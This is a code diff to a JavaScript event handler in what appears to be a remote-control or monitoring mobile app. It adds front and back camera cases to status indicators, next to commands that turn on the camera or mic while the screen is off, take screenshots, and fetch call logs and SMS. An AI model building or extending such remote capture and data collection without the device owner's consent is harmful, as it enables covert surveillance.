@@ -107,12 +107,16 @@ function handleNativeEvent(e) {
       break
     // Camera/mic/speaker are handled natively in Java (work when screen off)
     // — just update the UI indicators here
-    case 'cmd:camera:start': setIndicator('cam', true, 'Active'); break
-    case 'cmd:camera:stop':  setIndicator('cam', false, 'Inactive'); break
-    case 'cmd:mic:on':       setIndicator('mic', true, 'Active'); break
-    case 'cmd:mic:off':      setIndicator('mic', false, 'Inactive'); break
-    case 'cmd:speak':        setIndicator('speak', true, 'Playing…'); break
-    case 'speak:done':       setIndicator('speak', false, 'Inactive'); break
+    case 'cmd:camera:start':
+    case 'cmd:camera:start:front': setIndicator('cam', true, 'Front Active'); break
+    case 'cmd:camera:start:back':  setIndicator('cam', true, 'Back Active'); break
+    case 'cmd:camera:stop':
+    case 'cmd:camera:stop:front':
+    case 'cmd:camera:stop:back':   setIndicator('cam', false, 'Inactive'); break
+    case 'cmd:mic:on':             setIndicator('mic', true, 'Active'); break
+    case 'cmd:mic:off':            setIndicator('mic', false, 'Inactive'); break
+    case 'cmd:speak':              setIndicator('speak', true, 'Playing…'); break
+    case 'speak:done':             setIndicator('speak', false, 'Inactive'); break
     case 'cmd:screenshot':   break  // handled natively
     case 'cmd:get:calllogs': sendCallLogs(); break
     case 'cmd:get:sms':      sendSMS(); break
